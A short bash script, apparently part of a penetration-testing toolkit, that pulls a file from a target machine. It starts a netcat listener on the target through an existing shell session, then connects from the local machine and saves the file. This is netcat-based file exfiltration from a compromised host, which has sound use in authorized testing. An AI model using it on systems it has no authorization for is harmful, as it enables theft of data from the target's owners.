#!/bin/bash

source "/opt/pmp/functions.sh"

PORT=$(($RANDOM+3000))
TARGET_IP=$1
filename=$(basename $2)

hide_guake
command "nc -w 0 -lnvp $PORT < $2"
sleep 0.5
nc $TARGET_IP $PORT > $filename & 
